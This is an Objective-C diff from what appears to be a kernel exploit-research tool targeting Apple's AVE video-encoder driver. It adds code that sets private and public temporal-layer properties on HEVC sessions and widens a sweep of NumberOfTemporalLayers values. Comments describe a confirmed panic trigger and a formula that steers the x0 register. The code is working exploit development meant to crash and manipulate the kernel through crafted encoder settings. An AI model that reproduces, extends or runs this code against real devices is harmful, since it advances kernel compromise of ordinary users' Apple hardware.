@@ -257,6 +257,58 @@ extern kern_return_t IOConnectCallStructMethod(kp_io_connect_t conn, uint32_t se
     [report appendFormat:@"RCMode unclamped NTL=3: %d mode(s)%s\n", unclampedCount,
      unclampedCount ? "" : " (NTL clamped for every mode — deeper gate or entitlement)"];
 
+    // Private-key ladder (ave27 stage15 had a "private-key audit (23 keys)"):
+    // the driver may read NumOfTemporalLayer (singular) while the public
+    // NumberOfTemporalLayers is what VT validates and clamps.
+    [report appendString:@"\n--- NTL private-key ladder (probe NTL=3) ---\n"];
+    NSArray *ntlKeys = @[ @"NumberOfTemporalLayers", @"NumOfTemporalLayer", @"TemporalLayers" ];
+    for (NSString *nk in ntlKeys) {
+        VTCompressionSessionRef sK = NULL;
+        if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
+                                       NULL, NULL, NULL, NULL, NULL, &sK) != noErr || !sK) continue;
+        int usageK = 1;
+        CFNumberRef kn = CFNumberCreate(NULL, kCFNumberIntType, &usageK);
+        VTSessionSetProperty(sK, CFSTR("EncoderUsage"), kn); CFRelease(kn);
+        VTSessionSetProperty(sK, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
+        VTSessionSetProperty(sK, CFSTR("RealTime"), kCFBooleanTrue);
+        int probeK = 3;
+        kn = CFNumberCreate(NULL, kCFNumberIntType, &probeK);
+        OSStatus setK = VTSessionSetProperty(sK, (__bridge CFStringRef)nk, kn); CFRelease(kn);
+        int backPub = -1, backPriv = -1;
+        CFNumberRef bk = NULL;
+        if (VTSessionCopyProperty(sK, CFSTR("NumberOfTemporalLayers"), NULL, &bk) == noErr && bk) {
+            CFNumberGetValue(bk, kCFNumberIntType, &backPub); CFRelease(bk);
+        }
+        bk = NULL;
+        if (VTSessionCopyProperty(sK, CFSTR("NumOfTemporalLayer"), NULL, &bk) == noErr && bk) {
+            CFNumberGetValue(bk, kCFNumberIntType, &backPriv); CFRelease(bk);
+        }
+        [report appendFormat:@"  set %@=3 -> %d, readback public=%d private=%d\n",
+         nk, (int)setK, backPub, backPriv];
+        VTCompressionSessionInvalidate(sK);
+        CFRelease(sK);
+    }
+    VTCompressionSessionRef sH = NULL;
+    if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
+                                   NULL, NULL, NULL, NULL, NULL, &sH) == noErr && sH) {
+        int usageH = 1;
+        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &usageH);
+        VTSessionSetProperty(sH, CFSTR("EncoderUsage"), hn); CFRelease(hn);
+        OSStatus setH = VTSessionSetProperty(sH, CFSTR("hasNumberOfTemporalLayers"), kCFBooleanTrue);
+        int probeH = 3;
+        hn = CFNumberCreate(NULL, kCFNumberIntType, &probeH);
+        VTSessionSetProperty(sH, CFSTR("NumberOfTemporalLayers"), hn); CFRelease(hn);
+        int backH = -1;
+        CFNumberRef bh = NULL;
+        if (VTSessionCopyProperty(sH, CFSTR("NumberOfTemporalLayers"), NULL, &bh) == noErr && bh) {
+            CFNumberGetValue(bh, kCFNumberIntType, &backH); CFRelease(bh);
+        }
+        [report appendFormat:@"  set hasNumberOfTemporalLayers=YES -> %d, NTL readback=%d\n",
+         (int)setH, backH];
+        VTCompressionSessionInvalidate(sH);
+        CFRelease(sH);
+    }
+
     // === AVE27 stage13: NTL sweep on the proven trigger config (ollie) ===
     // Confirmed trigger (KPAuditAVE112705Module): 1280x720 + 420YpCbCr8BiPlanarVideoRange.
     // Steered NTL: x0 = ((NTL-16463) << 32) | 0x59
@@ -283,10 +335,10 @@ extern kern_return_t IOConnectCallStructMethod(kp_io_connect_t conn, uint32_t se
     // stage9 recipe recovered from the ave27 binary: EncoderUsage=1 + RCMode=20
     // is what arms NTL (the panic rung reads "EncoderUsage=1 RCMode=20 NTL=").
     // Pass 0 = RCMode=20 + rate companions; pass 1 = control without RCMode.
-    int ntlVals[] = { 1, 100, 16000, 16115, 16223, 16270, 16431, 16438, 16446, 16447, 16462 };
+    int ntlVals[] = { 1, 100, 15967, 16000, 16014, 16115, 16223, 16270, 16431, 16438, 16446, 16447, 16462 };
     for (int pass = 0; pass < 2; pass++) {
     BOOL useRC = (pass == 0);
-    for (int i = 0; i < 11; i++) {
+    for (int i = 0; i < 13; i++) {
         int ntl = ntlVals[i];
         uint64_t x0 = ((uint64_t)(int32_t)(ntl - 16463) << 32) | 0x59ULL;
         int64_t kOff = 16463 - (int64_t)ntl;
